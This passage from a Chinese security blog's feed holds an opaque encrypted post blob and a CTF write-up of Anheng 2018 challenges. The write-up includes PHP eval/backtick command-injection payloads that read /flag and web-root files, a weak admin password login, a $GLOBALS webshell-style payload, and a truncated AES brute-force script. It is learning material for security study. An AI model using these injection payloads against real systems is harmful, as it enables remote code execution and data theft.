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 </div>]]></content>
    
    <summary type="html">
    
      实验课结束后发布
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安恒9月部分赛题复现</title>
    <link href="0verwatch.top/anheng-9month.html"/>
    <id>0verwatch.top/anheng-9month.html</id>
    <published>2018-09-30T05:41:02.000Z</published>
    <updated>2018-10-04T09:51:57.259Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>To be patient…</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了<a id="more"></a>小结一下</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="babybypass"><a href="#babybypass" class="headerlink" title="babybypass"></a>babybypass</h4><p>这个题目我记得我当初做的时候是一直考虑着用<code>$</code>以及<code>_</code>去绕过这些数字字母之类的东西，突然发现他这个题目里面把那个<code>$</code>以及<code>_</code>也经过了过滤，这样的话就少了很多可能性，而且这题比原题的限制长度小了，更有难度。现在就开始总结一下从这个题目学到的知识点<br>1.php短标签输出，这个知识点很久之前就已经见过。<br><code>&lt;?=?&gt;</code>这个就是短标签，相当于<code>&lt;?php echo …;?&gt;</code>一般在php的配置文件<code>php.ini</code>中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>，但是在现实开发中一般不推崇这种做法。。<br>但这个题目就很巧妙用了这个东西<br>2.第二个就是关于php函数eval函数的一些东西，这里的php执行函数是eval，在php官方手册上面有这样一句话，这是一个坑了，要想执行代码的话，我们就需要先用<code>?&gt;</code>去闭合，把上一段代码就给结束离开 ，然后我们才可以利用<code>&lt;?=?&gt;</code>去输出<br><a href="https://imgchr.com/i/ilI9II" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilI9II.md.png" alt="ilI9II.md.png"></a></p><p>区别一下有些系统执行函数比如system(有回显)，exec(没回显)，以及反引号这类的，这是直接执行系统函数的，一会我们也会用到<br><img src="https://s1.ax1x.com/2018/09/30/ilIPit.png" alt="ilIPit.png"><br><img src="https://s1.ax1x.com/2018/09/30/ilIiJP.png" alt="ilIiJP.png"></p><p>3.Linux通配符的作用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*        代表『 0 个或无穷多个』任意字符</span><br><span class="line">?        代表『一定有一个』任意字符</span><br></pre></td></tr></table></figure></p><p>4.Linux 下面一切皆文件<br>就是说我们平常一般在下面Linux下面的输入的命令，都可以通过文件去同样的执行，这对我来说是新知识。。。。。<br><img src="https://s1.ax1x.com/2018/09/30/ilIMiq.png" alt="ilIMiq.png"></p><p>然后我们就可以去实现payload，这个题目是Apache搭的，我们可以去默认目录先查看一波文件，一般来说默认目录在<code>/var/www/html</code></p><p>构造<code>code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;</code></p><p>然后会发现php代码里面的源代码getflag那一部分的函数是是从/flag里面读取的。。。。听说这题的getflag函数也是个坑。。好像不能直接从url里面调用</p><p>所以再来构造一下<br><code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;</code>得到flag<br><a href="https://imgchr.com/i/ilIQJ0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIQJ0.md.png" alt="ilIQJ0.md.png"></a></p><h4 id="神奇的CMS"><a href="#神奇的CMS" class="headerlink" title="神奇的CMS"></a>神奇的CMS</h4><p>进入网站发现有用户登录，然后测试发现弱密码<br><code>admin admin123</code></p><p>然后点击几个模块发现有两个模块有点奇怪<br><a href="https://imgchr.com/i/ilIlWV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIlWV.md.png" alt="ilIlWV.md.png"></a></p><p>这两个模块一个模块有提示，另一个模块存在输入并且存在回显<br>先看提示，一是让你下载源码包，另外是提示flag在哪，先把源码包下载下来，源码里面有两个控制器，一个是<code>content</code>，另一个是<code>site</code></p><p>发现是Yii框架的东西，幸亏我还是做过Yii框架的开发的，对此还是有点小熟悉。。。</p><p>这里看回放的时候还是学到点东西的，就是我们在代码审计的时候一般要找有输入有输出的地方，这里很可能就存在这漏洞，这就相当于在脑里面建了一个模型，但是想想也很正常，平常我们学编程的时候也没过多的去考虑编程的输入输出，比如我们在一开始用C编程的时候你会忘掉除数不为0的前提吗？所以说我们更多的是考虑代码的核心功能能否实现。</p><p>所以在<code>ADD_IMG</code>(因为有输入有回显)页面里面就很有可能存在漏洞了，所以我们得专注代码里面描述这一段东西的内容</p><p> Yii框架讲究的是MVC架构，一般代码审计的话得先找<code>Controller</code>里面的东西毕竟都是些逻辑性的东西，关键的功能也在里面<br>所以在这个url里面的site是指的控制器，而backup就是site控制器里面的操作<br><img src="https://s1.ax1x.com/2018/09/30/ilI8QU.png" alt="ilI8QU.png"><br>我以前的博客讲过<br><a href="https://imgchr.com/i/ilIdF1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIdF1.md.png" alt="ilIdF1.md.png"></a></p><p>从代码里面你会发现<code>site</code>控制器里面都是些展示页面以及登陆的功能，但是不要过分以为登录里面会有sql注入，毕竟Yii框架里面是可以通过对login函数设置<code>rules</code>再来通过<code>validate</code>去检测是否出现SQL注入，所以出现sql注入机率不大</p><p>但是在回放里面学到了一种更骚气的代码调试的方法。。就是当你不懂框架的时候如何将其变成普通的php代码进行调试<br>这个方法就是将跟框架有关的东西去掉把关于框架的类看成一个普通的类，再把跟业务逻辑以及数据库相关操作的功能有关的去掉，然后新建那个类，单纯测试一下那个输入输出的函数就好</p><p>尝试调试，我这里用的phpstorm去调试，在<code>parstIf</code>函数下了断点，发现执行到下图所示的地方就会重新返回到echo输出语句中<br><a href="https://imgchr.com/i/ilIrQO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIrQO.md.png" alt="ilIrQO.md.png"></a><br>说明要在字符串里面加上<code>{if</code>此类的字符串<br>随便找一个地方加加，为的是能够进入else的循环<br><a href="https://imgchr.com/i/ilIbwj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIbwj.md.png" alt="ilIbwj.md.png"></a><br>进入else会发现到<code>buildregx</code>又会有一个新的函数，其实这个函数就是为了构建一个正则表达式，在字符串前后添加<code>/</code>，可以从debug的结果看得出来<br><a href="https://imgchr.com/i/ilIqTs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIqTs.md.png" alt="ilIqTs.md.png"></a><br>这时候我们就需要匹配<code>/{if:(.*?)}(.*?){end if}/is</code>这样的正则，但是之前的输入会导致其跳出该循环，从而又直接返回了结果，不能进入到for循环里面执行eval函数<br><a href="https://imgchr.com/i/ilIXYq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIXYq.md.png" alt="ilIXYq.md.png"></a><br>这时候就又需要构建对应的东西了，我们把正则里面的<code>(.*?)</code>改为自己随意的内容就好<br><a href="https://imgchr.com/i/ilIjf0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIjf0.md.png" alt="ilIjf0.md.png"></a><br>然后再追踪一次变化过程，经过<code>preg_match_all</code>这个函数的时候我们就可以看到这个函数会把原来的匹配的字符分成三段，首先是<code>iar[0][0]</code>是匹配到的字符串<code>{if:2333}23333{end if}</code>，然后是分别是第一个任意内容以及第二个任意内容匹正则配到的字符串，<code>iar[1][0]=2333,iar[2][0]=23333</code></p><p>继续走的话，这时候就可以进行一次循环了，因为现在arlen=1,然后我们就可以继续执行下去了，后买的事情就很简单了，先是判断<code>iar[1][0]</code>以及<code>iar[2][0]</code>里面是否有等号，再判断一下<code>iar[2][0]</code>里面是否有<code>{elseif</code>以及<code>else</code>，这几个判断都不影响<br><a href="https://imgchr.com/i/ilopXF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilopXF.md.png" alt="ilopXF.md.png"></a><br>最后还是将<code>iar[1][0]</code>放在这个eval语句里面执行<br><a href="https://imgchr.com/i/iloCm4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloCm4.md.png" alt="iloCm4.md.png"></a><br>梳理一下逻辑也就是说检查最少的是<code>iar[1][0]</code>，只检查他是否存在<code>=</code>，那就好办了，在eval语句中我们只需要对<code>iar[1][0</code>]闭合一下语句我们就可以执行我们想要的命令即可</p><p>Payload<br><code>{if:1)print_r(`cat /tmp/flag`);die();//}123{end if}</code>第一种思路直接在里面拼接命令执行语句即可<br><img src="https://s1.ax1x.com/2018/09/30/iloi79.png" alt="iloi79.png"></p><p>第二种思路就是在没有过滤<code>$GOLBALS</code>全局变量的前提下使用拼接，但个人感觉这东西会在PHP开发中给禁掉吧毕竟可能会对代码里面的其他变量造成影响，这个套路一般都是用来写过waf的小马用的</p><p><code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);die();//}{end if}</code></p><p>尝试这个的是时候还以为服务器坏了。。。突然发现<code>processing request</code>。。。应该是没传参，传参了就好了</p><p><a href="https://imgchr.com/i/iloAt1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloAt1.md.png" alt="iloAt1.md.png"></a></p><p><a href="https://imgchr.com/i/iloM0H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloM0H.md.png" alt="iloM0H.md.png"></a><br><a href="https://imgchr.com/i/iloQ7d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloQ7d.md.png" alt="iloQ7d.md.png"></a></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h4><p>这个题目帮我复习了一下信息安全数学基础第一章的内容，所以我就记录一下这个题目，其他题目就不写了</p><p>这个关键点就是作取余运算的时候结果是不会超过余数的，如果有打过ACM的人就会知道有一个叫快速幂的东西跟这个也差不多，极大地降低了代码所需要的空间度，使得数不会越界</p><p>观察主函数现在我们需要的就是<code>passwd</code>这个参数，但是从<code>generate_passwd</code>是得到最多<code>passwd</code>不会超过<code>0xB18E</code>，所以我们就可以选择爆破<br><a href="https://imgchr.com/i/ilo3tI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilo3tI.md.png" alt="ilo3tI.md.png"></a></p><p>跑一下脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data  = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> unpad(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_passwd</span><span class="params">(key,result)</span>:</span></span><br><span class="line">    data_halt = <span class="string">"LvR7GrlG0A4WIMBrUwTFoA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line">    rand_int =  int(decrypt(data_halt, key).encode(<span class="string">"hex"</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#round = 0x7DC59612</span></span><br><span class="line">    result = result * (rand_int % <span class="number">0xB18E</span>) % <span class="number">0xB18E</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(str(result), key)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    key = <span class="string">'17abeca4cc4c432a52c2b7f6d24d1888'</span></span><br><span class="line">    </span><br><span class="line">    output = <span class="string">"u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span 